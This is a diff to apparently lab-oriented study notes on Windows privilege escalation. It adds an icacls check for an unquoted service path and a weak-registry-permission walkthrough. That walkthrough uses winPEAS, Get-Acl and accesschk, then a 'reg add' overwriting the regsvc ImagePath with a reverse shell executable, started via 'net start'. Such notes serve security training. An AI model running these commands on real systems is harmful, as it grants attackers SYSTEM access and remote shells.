@@ -339,8 +339,54 @@ sc qc unquotedsvc
 # Copy the reverse shell executable and rename it appropriately:
 copy C:\PrivEsc\reverse.exe "C:\Program Files\Unquoted Path
 Service\Common.exe"
+
+# You can alos check the permission with icacls.
+
+icacls "c:\Program Files\Unquoted Path Service"
 # Start a listener on Kali, and then start the service to trigger the exploit:
 net start unquotedsvc
+
+```
+
+
+### Weak Registry Permission
+The Windows registry stores entries for each service.
+Since registry entries can have ACLs, if the ACL is
+misconfigured, it may be possible to modify a service’s
+configuration even if we cannot modify the service
+directly.
+
+#### winpeas output
+```powershll
+
+winPEASany.exe quiet servicesinfo
+```
+```bash
+
+  [+] Looking if you can modify any service registry()
+   [?] Check if you can modify the registry of a service https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#services-registry-permissions                                                                                                                 
+    HKLM\system\currentcontrolset\services\regsvc (Interactive [TakeOwnership])
+
+```
+
+```bash
+# Run winPEAS to check for service misconfigurations:
+ .\winPEASany.exe quiet servicesinfo
+
+# Note that the “regsvc” service has a weak registry entry. We can confirm this with
+
+PowerShell:
+PS> Get-Acl HKLM:\System\CurrentControlSet\Services\regsvc | Format-List
+
+# Alternatively accesschk.exe can be used to confirm:
+> .\accesschk.exe /accepteula -uvwqk HKLM\System\CurrentControlSet\Services\regsvc
+
+# Overwrite the ImagePath registry key to point to our reverse shell executable:
+> reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d
+C:\PrivEsc\reverse.exe /f
+
+#Start a listener on Kali, and then start the service to trigger the exploit:
+> net start regsvc
 ```
 
 ### Iperius Backup 6.1.0 - Privilege Escalation
